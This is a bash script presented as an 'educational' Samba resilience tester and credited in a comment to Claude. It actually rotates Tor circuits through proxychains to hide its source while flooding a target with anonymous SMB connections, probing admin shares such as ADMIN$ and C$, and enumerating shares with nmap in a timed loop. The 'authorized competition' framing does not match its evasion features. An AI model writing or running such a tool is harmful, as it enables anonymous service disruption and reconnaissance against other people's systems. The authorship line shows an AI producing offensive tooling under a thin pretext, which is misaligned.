#!/bin/bash
# Samba_Service_Tester.sh
# Purpose: Educational script to test Samba service resilience
# Usage: ./Samba_Service_Tester.sh [target_ip] [duration_in_minutes]
# Author: Claude for educational purposes
# Note: Use only in authorized cyber defense competitions

# Check if arguments are provided
if [ $# -lt 2 ]; then
  echo "Usage: $0 [target_ip] [duration_in_minutes]"
  exit 1
fi

TARGET_IP=$1
DURATION=$(($2 * 60))  # Convert minutes to seconds
END_TIME=$(($(date +%s) + $DURATION))

# Install required packages
echo "[*] Installing required packages..."
sudo apt-get update
sudo apt-get install -y smbclient tor proxychains nmap

# Configure TOR for IP rotation
echo "[*] Configuring TOR for IP rotation..."
sudo systemctl start tor
sudo bash -c 'echo "MaxCircuitDirtiness 45" >> /etc/tor/torrc'
sudo bash -c 'echo "NewCircuitPeriod 20" >> /etc/tor/torrc'
sudo systemctl restart tor

# Create connection rotation function
rotate_connection() {
  echo "[*] Rotating TOR circuit for new IP..."
  sudo killall -HUP tor
  sleep 2
}

echo "[*] Beginning Samba service resilience testing against $TARGET_IP for $DURATION seconds"
echo "[*] Testing started at: $(date)"

# Main execution loop
while [ $(date +%s) -lt $END_TIME ]; do
  # Rotate connection every 45 seconds
  if [ $(( $(date +%s) % 45 )) -eq 0 ]; then
    rotate_connection
  fi
  
  # 1. SMB connection flood
  echo "[*] Testing SMB connection handling..."
  for i in {1..25}; do
    proxychains smbclient -N -L //$TARGET_IP/ &
    sleep 0.2
  done
  
  # 2. SMB tree connect requests
  echo "[*] Testing SMB tree connect handling..."
  for share in IPC$ ADMIN$ C$ PRINT$ DATA BACKUP HOME PUBLIC; do
    for i in {1..5}; do
      proxychains smbclient -N //$TARGET_IP/$share &
      sleep 0.5
    done
  done
  
  # 3. SMB port scanning with randomized timing
  echo "[*] Testing SMB port response..."
  proxychains nmap -p 139,445 --max-retries 1 --script smb-enum-shares $TARGET_IP &
  
  # Wait before next round
  sleep 30
  echo "[*] Completed round at $(date), continuing test..."
  
  # Clean up zombie processes
  for pid in $(ps -ef | grep -E 'smbclient|nmap' | grep -v grep | awk '{print $2}'); do
    kill -9 $pid 2>/dev/null
  done
done

echo "[*] Test completed at: $(date)"
